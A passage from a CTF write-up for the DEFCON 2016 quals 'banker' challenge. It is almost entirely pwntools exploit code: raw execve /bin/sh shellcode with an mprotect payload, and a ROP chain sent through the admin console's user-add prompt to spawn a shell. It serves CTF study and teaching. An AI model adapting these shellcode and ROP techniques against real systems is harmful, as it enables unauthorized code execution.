#shellcode = asm(asm(shellcraft.i386.linux.sh(),arch='i386')
shellcode = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0b\x58\x99\xcd\x80"
  
shellcode = "\x90"*0x80+shellcode
pay = cyclic(4)
pay += p32(0x8082671)   #mprotect
pay += p32(0x41414141)
pay += p32(buf)
pay += p32(0x08101000)  #addr
pay += p32(0x1000)  #len
pay += p32(0x7)     #prot
pay += shellcode
  
p.sendline(pay)
  
p.interactive()
```

```python title="exploit_rop.py"
#!/usr/bin/python
from pwn import *

p = process("./banker")
  
def login():
    p.recvuntil('Enter username: ')
    p.sendline('test')
    p.recvuntil('Enter password: ')
    p.sendline('test')
   
def useradd(pay):
    p.sendlineafter('6) Admin Console','6')
    p.sendlineafter('4) Exit','1')
    p.sendlineafter('Enter New Username:','1')
    p.sendlineafter('Enter New Password:',pay)
    p.sendlineafter('4) Exit','4')
    p.sendlineafter('6) Admin Console','5')
  
   
get_input   = 0x0804a6b0
get_str_len = 0x0804abae
dest        = 0x08102010
src     = 0x08101110
max_len     = 0x01010101
pppr        = 0x08083650
ppr     = pppr + 1
int80       = 0x080566a3
  
login()
  
payload = cyclic(0x42)
payload += p32(get_input)
payload += p32(ppr)
payload += p32(dest)
payload += p32(src)
payload += p32(max_len)
   
payload += p32(get_str_len)
payload += p32(pppr)
payload += p32(dest)
payload += cyclic(0x8)
payload += p32(pppr)
payload += p32(0x08101120)  #edx
payload += p32(0x08101120)  #ecx
payload += p32(src + 0x4)   #ebx
   
payload += p32(int80)
 
#sleep(30)
useradd(payload)
   
sleep(1)
p.sendline('    /bin/sh\x00')
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**

* <https://github.com/DaramG/ctf-writeup/tree/master/2016_defcon/banker>
* <http://ww9210.cn/2016/05/26/defcon-2016-ctf-quals-pwnable-banker-writeup/>